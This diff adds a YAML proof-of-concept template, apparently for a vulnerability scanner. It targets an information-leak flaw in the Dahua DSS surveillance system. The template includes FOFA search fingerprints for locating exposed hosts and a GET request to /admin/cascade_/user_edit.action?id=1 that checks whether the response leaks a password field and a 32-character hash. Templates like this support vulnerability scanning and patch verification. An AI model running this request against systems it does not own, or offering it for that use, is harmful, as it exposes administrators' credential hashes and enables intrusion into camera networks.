@@ -1,0 +1,16 @@
+id: poc-yaml-dahua-dss-user-edit-action-information-leak
+info:
+  name: 大华 DSS user_edit.action 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 大华 DSS 数字监控系统
+  fofa: body="<meta http-equiv=\"refresh\" content=\"1;url='/admin'\"></span>" ||
+    body="dahuaDefined/headCommon.js" || title=="DSS"
+requests:
+- method: GET
+  path: /admin/cascade_/user_edit.action?id=1
+  expression: status_code == 200 && contains(body,"Password") && contains(body,"Compulsive
+    Info") && matches(body,"[0-9a-z]{32}")
+variables: {}
+transport: http
